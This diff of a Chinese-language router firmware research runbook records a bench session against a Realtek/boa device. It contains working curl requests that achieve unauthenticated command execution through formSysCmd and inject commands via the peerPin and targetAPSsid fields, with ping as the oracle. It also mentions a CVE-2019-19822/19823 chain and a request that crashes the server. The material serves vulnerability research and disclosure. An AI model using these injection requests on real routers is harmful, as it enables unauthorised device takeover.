@@ -1124,7 +1124,7 @@ xxd "$HOME/fwre-work/dumps/probe.bin"
 
 | 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
 |---|---|---|---|
-| T2 | **不可逆** | [`RUNBOOK` §8.12.17](RUNBOOK.md) | 未執行過（撰於 2026-08-17） |
+| T2 | **不可逆** | [`RUNBOOK` §8.12.17](RUNBOOK.md) | 2026-08-17 夜（首次執行，三段判據全中；`EB` 一行的容量首次量到） |
 
 **先決條件**：`A2.5` 六步全過（`P0-3`）；板子停在 `<RealTek>`；來源檔與它的 sha256 在手上
 
@@ -1395,7 +1395,7 @@ enxfc19286184c9  UNKNOWN        10.1.1.100/24
 > `---Ethernet init Okay!`），但 `IPCONFIG` 之前它不回應 IP。
 
 **為什麼是 `10.1.1.100`**：這台的 LAN 位址是 `10.1.1.1`（從它自己的 `COMPCS` 解出來的，
-不是猜的），DHCP 池是 `10.1.1.10`–`254`。`.100` 在池子裡但不會跟前幾個租約撞。
+不是猜的），DHCP 池是 `10.1.1.100`–`254`。`.100` 在池子裡但不會跟前幾個租約撞。
 **如果你的機器不是 `10.1.1.1`**，先解出來：
 
 ```bash
@@ -2453,7 +2453,7 @@ raw: 14068 of 65536 bytes differ
 
 | 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
 |---|---|---|---|
-| T3 | **A1 的第一發是零副作用；之後會寫 `/var`（ramfs），`A3.10` 才寫 flash** | [`RUNBOOK` §8.12.18](RUNBOOK.md) | 未執行過（撰於 2026-08-17） |
+| T3 | **A1 的第一發是零副作用；之後會寫 `/var`（ramfs），`A3.10` 才寫 flash** | [`RUNBOOK` §8.12.18](RUNBOOK.md) | 2026-08-17 夜（`P3-3` 成立；`P3-1` 與 `P3-2` 反證） |
 
 **先決條件**：`A3.1` 網段；`A2.3` 的前置快照已抓；[`docs/disclosure.md`](docs/disclosure.md)
 已寫明本節每個標的的狀態；主機端 `tcpdump` 已在跑
@@ -2477,14 +2477,23 @@ raw: 14068 of 65536 bytes differ
 #### A3.9.1 對照組：先證明你抓得到 ICMP
 
 ```bash
-sudo tcpdump -ni eth1 -w "$HOME/fwre-work/dumps/w06-icmp.pcap" icmp &
+IF="$(ip -br link | awk '/^enx/{print $1; exit}')"
+sudo tcpdump -ni "$IF" -w "$HOME/fwre-work/dumps/w06-icmp.pcap" icmp &
 sleep 2
 ping -c 2 10.1.1.1
-sudo pkill -f 'tcpdump -ni eth1' ; sleep 1
+sudo pkill -x tcpdump ; sleep 1
 tshark -r "$HOME/fwre-work/dumps/w06-icmp.pcap" -T fields -e ip.src -e ip.dst -e icmp.type
 ```
 
-**預期**：四列，`10.1.1.10 → 10.1.1.1` type 8 與 `10.1.1.1 → 10.1.1.10` type 0 各兩筆。
+**預期**：四列，`10.1.1.100 → 10.1.1.1` type 8 與 `10.1.1.1 → 10.1.1.100` type 0 各兩筆。
+
+> ⚠️ **`$IF` 用推導的，不要寫死。** 這個 repo 因為寫死 `eth1` 被咬過一次
+> （W05，儀器 bug 21 那一串）：介面名在不同機器上不一樣，而抓不到封包跟
+> 「命令沒執行」在輸出上完全一樣。
+
+> ⚠️ **`pkill -x tcpdump` 不要寫成 `pkill -f 'tcpdump -ni ...'`。**
+> `-f` 比對整條命令列，而**呼叫它的那個 shell 的命令列裡就有那個字串**，
+> 於是它把自己殺掉，回一個沒有其他線索的 exit 15。2026-08-17 實地踩過。
 
 > ❌ **抓不到 → 停，先修抓包。** 之後注入那一發沒有封包時，你必須能區分
 > 「命令沒執行」和「我沒在聽」。**先把後者排除掉，這一節才有判別力。**
@@ -2493,14 +2502,14 @@ tshark -r "$HOME/fwre-work/dumps/w06-icmp.pcap" -T fields -e ip.src -e ip.dst -e
 #### A3.9.2 ★ A1：`formSysCmd`，ICMP oracle，**不帶任何憑證**（關 `P3-3`）
 
 ```bash
-sudo tcpdump -ni eth1 -w "$HOME/fwre-work/dumps/w06-p33.pcap" icmp &
+sudo tcpdump -ni "$IF" -w "$HOME/fwre-work/dumps/w06-p33.pcap" icmp &
 sleep 2
 curl -s -o /dev/null -w 'HTTP %{http_code}  %{time_total}s\n' \
   -X POST http://10.1.1.1/boafrm/formSysCmd \
-  --data-urlencode 'sysCmd=ping -c 3 10.1.1.10' \
+  --data-urlencode 'sysCmd=ping -c 3 10.1.1.100' \
   --data 'submit-url=/syscmd.htm'
 sleep 4
-sudo pkill -f 'tcpdump -ni eth1' ; sleep 1
+sudo pkill -x tcpdump ; sleep 1
 tshark -r "$HOME/fwre-work/dumps/w06-p33.pcap" -T fields -e ip.src -e ip.dst -e icmp.type
 ```
 
@@ -2508,9 +2517,9 @@ tshark -r "$HOME/fwre-work/dumps/w06-p33.pcap" -T fields -e ip.src -e ip.dst -e 
 
 ```text
 HTTP 302  0.012s
-10.1.1.1	10.1.1.10	8
-10.1.1.1	10.1.1.10	8
-10.1.1.1	10.1.1.10	8
+10.1.1.1	10.1.1.100	8
+10.1.1.1	10.1.1.100	8
+10.1.1.1	10.1.1.100	8
 ```
 
 > 🔴 **判據是「來源是 `10.1.1.1` 的 type 8」** —— 也就是**路由器主動發出**的 echo
@@ -2539,7 +2548,7 @@ HTTP 302  0.012s
 curl -s -o /dev/null -w 'with credentials: HTTP %{http_code}\n' \
   -u '<USER_NAME>:<USER_PASSWORD>' \
   -X POST http://10.1.1.1/boafrm/formSysCmd \
-  --data-urlencode 'sysCmd=ping -c 1 10.1.1.10' --data 'submit-url=/syscmd.htm'
+  --data-urlencode 'sysCmd=ping -c 1 10.1.1.100' --data 'submit-url=/syscmd.htm'
 ```
 
 **預期**：一樣是 `302`，一樣有 ICMP。**兩者行為相同，就是「認證與否不影響」** ——
@@ -2608,19 +2617,19 @@ curl -s http://10.1.1.1/cpu.txt
 
 ```bash
 # A2 —— peerPin 只寫 /var,重開就乾淨,所以排在 localPin(A3.10)之前
-sudo tcpdump -ni eth1 -w "$HOME/fwre-work/dumps/w06-p31.pcap" icmp &
+sudo tcpdump -ni "$IF" -w "$HOME/fwre-work/dumps/w06-p31.pcap" icmp &
 sleep 2
 curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formWsc \
-  --data-urlencode 'peerPin=1;ping -c 3 10.1.1.10;#' \
+  --data-urlencode 'peerPin=1;ping -c 3 10.1.1.100;#' \
   --data 'submit-url=/wireless.htm'
-sleep 4 ; sudo pkill -f 'tcpdump -ni eth1' ; sleep 1
+sleep 4 ; sudo pkill -x tcpdump ; sleep 1
 tshark -r "$HOME/fwre-work/dumps/w06-p31.pcap" -T fields -e ip.src -e icmp.type
 ```
 
 ```bash
 # A4 —— 預期不是命令注入而是溢位:R2 的 6 個 site 不含 targetAPSsid
 curl -s -o /dev/null -w 'A4: HTTP %{http_code}\n' -X POST http://10.1.1.1/boafrm/formWsc \
-  --data-urlencode 'targetAPSsid=1;ping -c 3 10.1.1.10;#' \
+  --data-urlencode 'targetAPSsid=1;ping -c 3 10.1.1.100;#' \
   --data 'submit-url=/wireless.htm'
 ```
 
@@ -2641,12 +2650,12 @@ curl -s -o /dev/null -w 'A4: HTTP %{http_code}\n' -X POST http://10.1.1.1/boafrm
 ```bash
 # 1) 同一個 handler,參數放在 query string
 curl -s -o /dev/null -w 'GET  : HTTP %{http_code}\n' \
-  "http://10.1.1.1/boafrm/formSysCmd?sysCmd=ping%20-c%203%2010.1.1.10&submit-url=/syscmd.htm"
+  "http://10.1.1.1/boafrm/formSysCmd?sysCmd=ping%20-c%203%2010.1.1.100&submit-url=/syscmd.htm"
 # 2) POST,但加上不同的 submit 按鈕名
 for b in submit-url Apply save "Save Setting"; do
   curl -s -o /dev/null -w "btn=$b : HTTP %{http_code}\n" \
     -X POST http://10.1.1.1/boafrm/formSysCmd \
-    --data-urlencode 'sysCmd=ping -c 1 10.1.1.10' --data-urlencode "$b=/syscmd.htm"
+    --data-urlencode 'sysCmd=ping -c 1 10.1.1.100' --data-urlencode "$b=/syscmd.htm"
 done
 ```
 
@@ -2676,7 +2685,7 @@ curl -s -o /dev/null -w 'w06.txt now: HTTP %{http_code}\n' http://10.1.1.1/w06.t
 
 | 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
 |---|---|---|---|
-| T3（開火）+ T2（前後快照） | **寫 flash，重開機不會消失** | [`RUNBOOK` §8.12.19](RUNBOOK.md) | 未執行過（撰於 2026-08-17） |
+| T3（開火）+ T2（前後快照） | **寫 flash，重開機不會消失** | [`RUNBOOK` §8.12.19](RUNBOOK.md) | 2026-08-17 夜（九個 byte，而且寫在 `H601` 不是 `COMPCS`） |
 
 **先決條件**：`A2.5` 通過（`P0-3`）；`A3.9.2` 已證明注入成立；前置快照已抓
 
@@ -2753,7 +2762,7 @@ curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formWsc \
 
 | 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
 |---|---|---|---|
-| T3 | **寫 flash，而且寫的是憑證** | [`RUNBOOK` §8.12.20](RUNBOOK.md) | 未執行過（撰於 2026-08-17） |
+| T3 | **寫 flash，而且寫的是憑證** | [`RUNBOOK` §8.12.20](RUNBOOK.md) | 2026-08-17 夜（`P10-3` 與 `P10-4` 都成立） |
 
 **先決條件**：`A3.6` / `A3.7` 已完成（那條 CVE-2019-19822 → 19823 的鏈**必須先做完**）；
 `A2.6` 的還原路徑已經驗過；前置快照已抓
@@ -2822,7 +2831,7 @@ curl -s -o /dev/null -w 'unauth  : %{http_code}\n' http://10.1.1.1/password.htm
 
 | 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
 |---|---|---|---|
-| T3 | **會讓 web server 消失，而且 `rcS` 只起它一次** | [`RUNBOOK` §8.12.21](RUNBOOK.md) | 未執行過（撰於 2026-08-17） |
+| T3 | **會讓 web server 消失，而且 `rcS` 只起它一次** | [`RUNBOOK` §8.12.21](RUNBOOK.md) | 2026-08-17 夜（`P4-1`–`P4-4` 全部反證；另發現一個請求殺掉 server） |
 
 **先決條件**：**這一站其他每一節都做完了**；快照已抓
 
@@ -3102,17 +3111,31 @@ Part A 是 `A0`→`A14`，而下面 W05 那兩列的實際順序是 `A0`→`A2`�
 **這一週實際發生了什麼、以及四個儀器缺陷** → [`BENCH-LOG.md`](BENCH-LOG.md)。
 **判定** → [`test-ledger.md`](test-ledger.md)。**推理** → [`PROGRESS.md`](PROGRESS.md)。
 
-## B-W06 PoC（未開始）
+## B-W06 PoC（2026-08-17 夜，已完成：登記簿 18/18、G4 四之五）
 
-**開場三件事，照這個順序：**
+| 場次 | 順序 | 本週特有 |
+|---|---|---|
+| 第 2 站 ① | `A1.1` → `A2.1` → `A2.2` → `A2.3` → **`A2.6`**（`probe-eb` → 工具演練 → 寫入 → 分段驗證）→ `A2.3` | `A2.6` 首次執行；`EB` 一行的容量首次量到 |
+| 第 3 站 ① | `A3.1` → `A3.6` → `A3.6.4` → `A3.7` → `A3.9`（全）→ `A3.10.2` 開火 | 第 ⑤ 環開火 |
+| 第 2 站 ② | `A2.2` → `A2.3` | 第 ⑤ 環的「後」快照 |
+| 第 3 站 ② | `A3.11` → `A3.12` | `A3.12` 打錯 handler 兩次，第三次才找到會回顯的證人 |
+| 第 3 站 ③ | 單發 `formSchedule` + 三發對照 | `D-11`：一個請求殺掉 server |
+| 第 3 站 ④ | 還原 WSC PIN → `poc/run.sh --target` | 腳本本身第一次被執行 |
+| 第 2 站 ③ | `A2.2` → `A2.3` | 收工快照、`P10-10` |
 
-1. **還原 `COMPDS`** —— 2026-08-17 的 POST 輪把它覆蓋成 `COMPCS` 了。
-   來源：`config-region-20260817-1102-pre.bin`（與 8/16 完整 dump 的前 64 KiB 相同）。
-   範圍：`0x8000`–`0xC000`，16 KiB = 4 個磁區。走 `A2.5`。
-   **然後重新建立 IoC 基準**，之後才有對照組。
-2. `A1.1` → `A2.1` → `A2.2` → `A2.3` → `A3.1` → `A4.1`，加上開火與還原。
-3. **決定 `BENCH-LOG.md` 標頭那個 MAC 矛盾往哪邊收** ——
-   標頭說 per-unit 識別碼不寫進來，而上午那一段寫了兩個 MAC。
+**這一週的順序有三個地方跟 Part A 的文件順序不同，三個都有理由：**
+
+1. **`A3.12` 裡 `P4-1` 排到最後。** Part A 把它排第一，而它自己的預測就是
+   「一個請求、零 payload，server 消失」—— 排第一等於在其餘四項有機會之前
+   就燒掉一次開機循環。
+2. **`A2.6` 的還原排在開場。** 事後證明**那是錯的**：本場自己的 POST 又把
+   `COMPDS` 蓋回去了。**它屬於一場的最後。** 這一列保留原樣是因為本節只追加，
+   而修正寫在 `A2.6` 那一節與 `BENCH-LOG.md` 卡 9。
+3. **第 2 站進了三次。** 第 ⑤ 環要「注入前」與「注入後」各一份快照，而快照在第 2 站。
+   八次開機循環裡有三次是 `boa` 被打掛之後的復原。
+
+**這一週實際發生了什麼、以及五個儀器缺陷** → [`BENCH-LOG.md`](BENCH-LOG.md)。
+**判定** → [`test-ledger.md`](test-ledger.md)。**推理** → [`PROGRESS.md`](PROGRESS.md)。
 
 ---
 
